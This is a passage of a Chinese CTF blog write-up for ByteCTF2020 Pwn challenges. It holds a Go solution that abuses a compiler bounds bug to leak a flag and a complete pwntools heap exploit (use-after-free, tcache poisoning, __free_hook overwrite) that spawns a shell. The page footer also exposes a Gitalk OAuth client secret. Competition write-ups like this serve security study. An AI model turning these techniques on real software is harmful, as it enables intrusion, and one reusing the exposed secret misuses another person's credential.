+<p>有关setcontext()的利用见：<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/993">setcontext 函数exploit - Ex个人博客</a></p>
+</blockquote>
+<blockquote>
+<p>以及构造rop链时遇到了一个玄学问题…使用libc中的<code>pop rdx ; ret</code>的gadget会触发Segmentation Fault，只好改用<code>pop rdx ; pop rbx ; ret</code>的gadget来更改rdx寄存器的值…原因不明…</p>
+</blockquote>
+<h2 id="0x02-leak-golang-data-race"><a href="#0x02-leak-golang-data-race" class="headerlink" title="0x02.leak - golang data race"></a>0x02.leak - golang data race</h2><p>原题给出了一个不完整的golang程序：</p>
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
+    flag := []<span class="hljs-keyword">int64</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;
+    <span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> flag &#123;
+  flag[i] = v + <span class="hljs-number">1</span>
+    &#125;
+    hack()
+&#125;
+<span class="hljs-comment">/* your function will be placed here */</span>
+<span class="hljs-comment">/* input the whole hack() function as follow */</span>
+<span class="hljs-comment">/* and end the code with &#x27;#&#x27; */</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">func hack() &#123;</span>
+<span class="hljs-comment">    TODO</span>
+<span class="hljs-comment">&#125;</span>
+<span class="hljs-comment">*/</span></code></pre>
+
+<p>我们所需要做的就是补充<code>hack()</code>函数的结构体，<strong>以泄露main()函数中保存的flag</strong></p>
+<p>面向github做题可以发现这个issue：<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/40367">cmd/compile: for range loop reading past slice end #40367</a></p>
+<p>稍微改一改我们的exp就出来了：</p>
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hack</span><span class="hljs-params">()</span></span> &#123;
+	rates:=[]<span class="hljs-keyword">uint64</span>&#123;<span class="hljs-number">0xff</span>&#125;
+	<span class="hljs-keyword">for</span> star, rate := <span class="hljs-keyword">range</span> rates &#123;
+		<span class="hljs-keyword">if</span> star+<span class="hljs-number">1</span> &lt; <span class="hljs-number">1</span> &#123;
+			<span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;&quot;</span>)
+		&#125;
+		<span class="hljs-built_in">print</span>(<span class="hljs-keyword">string</span>(rate<span class="hljs-number">-1</span>))
+&#125;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
+    flag := []<span class="hljs-keyword">int64</span>&#123;<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;
+    <span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> flag &#123;
+  flag[i] = v + <span class="hljs-number">1</span>
+    &#125;
+    hack()
+&#125;</code></pre>
+
+<p>运行即可获得flag</p>
+<p><img src="https://i.loli.net/2021/02/10/4vzxbBdjD85uZhA.png" srcset="/img/loading.gif"></p>
+<blockquote>
+<p>某种程度上算是个社工题233333</p>
+<p>以及这个bug已经在更高版本的go编译器中被修复（&gt; 1.14.6）</p>
+</blockquote>
+<h2 id="0x03-Pwndroid"><a href="#0x03-Pwndroid" class="headerlink" title="0x03.Pwndroid"></a>0x03.Pwndroid</h2><h1 id="0x02-线下赛-AWD-PWN"><a href="#0x02-线下赛-AWD-PWN" class="headerlink" title="0x02.线下赛 - AWD - PWN"></a>0x02.线下赛 - AWD - PWN</h1><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="0x00-diary-Use-After-Free-tcache-poisoning-heap-overflow"><a href="#0x00-diary-Use-After-Free-tcache-poisoning-heap-overflow" class="headerlink" title="0x00.diary - Use After Free + tcache poisoning + heap overflow"></a>0x00.diary - Use After Free + tcache poisoning + heap overflow</h3><p><a href="/download/bytectf2020/final/awd/day1/diary/diary" title="点击此处下载原题">点击下载-diary</a></p>
+<p><del>感悟：这次线下的AWD逆向量巨大，符号表扣光，神必C++看着十分头晕</del>主要还是我太菜了Or2</p>
+<p>最简单的签到题，<del>以至于我写完exp之后大家早就都修好了，甚至通防一挂这题就没法拿到shell了，所以基本上也不用修，不过想想似乎还是能够利用任意写在栈上构造ROP以后ORW读flag，但是比赛的时候忙着看后面的题去了</del></p>
+<p>大概是以下几个点：</p>
+<ul>
+<li>delete堆块的时候没有置零存在UAF</li>
+<li>edit时会输出堆块大小，也就是输出FD，FD指针用来存储堆块大小，可以泄露堆地址和栈基址</li>
+<li>由于犯了以chunk的FD指针来判断堆块大小的逻辑错误判断，于是delete后再edit可以进行堆块溢出</li>
+<li>修改__free_hook为system以后释放一个内容为”/bin/sh”的块即可get shell</li>
+</ul>
+<p>比赛中踩坑的点：</p>
+<ul>
+<li>由于FD用于储存堆块大小，利用edit泄露main_arena的时候会破坏BK，需要手动将main_arena + 96输回去</li>
+<li>同上，由于输入都是从BK开始，故需要堆溢出改一个chunk的FD为”/bin/sh”</li>
+</ul>
+<p>比赛时写的exp如下：（稍微有一丶乱…）</p>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+
+p = process(<span class="hljs-string">&#x27;./diary&#x27;</span>)<span class="hljs-comment">#remote(&#x27;&#x27;, 5021)</span>
+e = ELF(<span class="hljs-string">&#x27;./diary&#x27;</span>)
+libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>) <span class="hljs-comment"># test locally</span>
+one_gadget = <span class="hljs-number">0xe6e73</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">index:int</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;Options&#x27;</span>)
+    p.sendline(str(index).encode())
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">name, size:int, content</span>):</span>
+    cmd(<span class="hljs-number">1</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)
+    p.sendline(name)
+    p.recvuntil(<span class="hljs-string">b&quot;Size:&quot;</span>)
+    p.sendline(str(size).encode())
+    p.recvuntil(<span class="hljs-string">b&quot;Content:&quot;</span>)
+    p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name, content</span>):</span>
+    cmd(<span class="hljs-number">2</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)
+    p.sendline(name)
+    p.recvuntil(<span class="hljs-string">b&quot;bytes:&quot;</span>)
+    p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">name</span>):</span>
+    cmd(<span class="hljs-number">3</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)
+    p.sendline(name)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span>():</span>
+    cmd(<span class="hljs-number">4</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
+    new(<span class="hljs-string">&#x27;arttnba1&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)
+    new(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;arttnba0&#x27;</span>)
+    new(<span class="hljs-string">&#x27;arttnba2&#x27;</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;arttnba2&#x27;</span>)
+    new(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;shell&#x27;</span>)
+    new(<span class="hljs-string">&#x27;sheep&#x27;</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;sheep&#x27;</span>)
+    <span class="hljs-comment">#gdb.attach(p)</span>
+    
+    <span class="hljs-comment"># fill the tcache</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+        free(<span class="hljs-string">&#x27;arttnba0&#x27;</span>)
+        edit(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment"># clear the tcache key</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+        free(<span class="hljs-string">&#x27;shell&#x27;</span>)
+        edit(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
+        free(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)
+        edit(<span class="hljs-string">&#x27;arttnba2&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+
+    <span class="hljs-comment"># leak the heap addr</span>
+    free(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)
+    p.recv()
+    cmd(<span class="hljs-number">2</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)
+    p.sendline(<span class="hljs-string">&#x27;arttnba2&#x27;</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Input&quot;</span>)
+    heap_addr = int(p.recvuntil(<span class="hljs-string">&#x27;bytes&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)
+    p.sendline(<span class="hljs-string">&#x27;&#x27;</span>)
+    
+    
+    new(<span class="hljs-string">&#x27;arttnba3&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;arttnba3&#x27;</span>)
+    <span class="hljs-comment"># fill the tcache</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
+        free(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)
+        edit(<span class="hljs-string">&#x27;arttnba3&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+
+    <span class="hljs-comment"># leak the libc</span>
+    free(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)
+    p.recv()
+    cmd(<span class="hljs-number">2</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Name:&quot;</span>)
+    p.sendline(<span class="hljs-string">&#x27;arttnba3&#x27;</span>)
+    p.recvuntil(<span class="hljs-string">b&quot;Input&quot;</span>)
+    main_arena = int(p.recvuntil(<span class="hljs-string">&#x27;bytes&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">96</span>
+    p.sendline(p64(main_arena + <span class="hljs-number">96</span>)) <span class="hljs-comment"># fix the heap</span>
+    malloc_hook = main_arena - <span class="hljs-number">0x10</span>
+    libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]
+    log.info(<span class="hljs-string">&#x27;libc addr: &#x27;</span> + hex(libc_base))
+
+    <span class="hljs-comment">#gdb.attach(p)</span>
+    <span class="hljs-comment"># tcache poisoning</span>
+    edit(<span class="hljs-string">&#x27;arttnba0&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x8</span> + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0</span> + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">8</span>) * <span class="hljs-number">3</span>)
+    new(<span class="hljs-string">&#x27;arttnba7&#x27;</span>, <span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])*<span class="hljs-number">2</span>)
+    new(<span class="hljs-string">&#x27;freehook&#x27;</span>, <span class="hljs-number">0x20</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])*<span class="hljs-number">2</span>)
+    <span class="hljs-comment">#gdb.attach(p)</span>
+    <span class="hljs-comment">#p.interactive()</span>
+    edit(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x8</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x50</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">10</span>)
+    <span class="hljs-comment">#gdb.attach(p)</span>
+    free(<span class="hljs-string">&#x27;sheep&#x27;</span>) <span class="hljs-comment"># system(&quot;/bin/sh&quot;)</span>
+    p.interactive()
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    exp()
+</code></pre>
+
+<h3 id="0x01-Tiktok-StackOverFlow-Use-After-Free"><a href="#0x01-Tiktok-StackOverFlow-Use-After-Free" class="headerlink" title="0x01.Tiktok - StackOverFlow | Use After Free"></a>0x01.Tiktok - StackOverFlow | Use After Free</h3><p><a href="/download/bytectf2020/final/awd/day1/tiktok/vm" title="点击此处下载原题">点击下载-pwn</a></p>
+<h3 id="0x02-vm"><a href="#0x02-vm" class="headerlink" title="0x02.vm -"></a>0x02.vm -</h3><p><a href="/download/bytectf2020/final/awd/day1/vm/chall" title="点击此处下载原题">点击下载-chall</a></p>
+<h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="0x00-chatroom"><a href="#0x00-chatroom" class="headerlink" title="0x00.chatroom -"></a>0x00.chatroom -</h3><p><a href="/download/bytectf2020/final/awd/day2/chatroom/pwn" title="点击此处下载原题">点击下载-pwn</a></p>
+<blockquote>
+<p>说实话因为第二天就打个上午…基本上都在摸🐟…</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%A0%86/">堆</a>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/tcache-poisoning/">tcache poisoning</a>
+                    
+                      <a class="hover-with-bg" href="/tags/double-free/">double free</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Use-After-Free/">Use After Free</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ByteCTF/">ByteCTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/null-by-any-address/">null by any address</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【NOTES.0x00】glibc2.23malloc源码分析 - I：堆内存的基本组织形式</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/25/PIECES-0X00/">
+                        <span class="hidden-mobile">【PIECES.0X00】追逐着时光的流沙</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    function loadGitalk() {
+      addScript('https://cdn.staticfile.org/blueimp-md5/2.13.0/js/md5.min.js');
+      addScript('https://cdn.staticfile.org/gitalk/1.6.2/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: 'b012ce640e67f72b3101',
+          clientSecret: '432cfbb09cfbb0b19100c1ab65cb5efbf906c138',
+          repo: 'BlogComment',
+          owner: 'arttnba3',
+          admin: ["arttnba3"],
+          id: md5(location.pathname),
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: false
+        });
+        gitalk.render('gitalk-container');
+      });
+    }
+    waitElementVisible('gitalk-container', loadGitalk);
+  </script>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  
+  <div class="text-center py-3">
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+    var now = new Date();
+    function createtime(){
+        var grt= new Date("04/20/2020 17:48:52");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24;
+        dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+        hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){
+            hnum = "0" + hnum;
+        }
+        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes);
+        if(String(mnum).length ==1 ){
+                  mnum = "0" + mnum;
+        }
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds);
+        if(String(snum).length ==1 ){
+                  snum = "0" + snum;
+        }
+        document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了&nbsp"+dnum+"&nbsp天";
+        document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+    }
+    setInterval("createtime()",250);
+    </script>
+  
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "【CTF.0X01】ByteCTF2020-Pwn WP&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 60,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
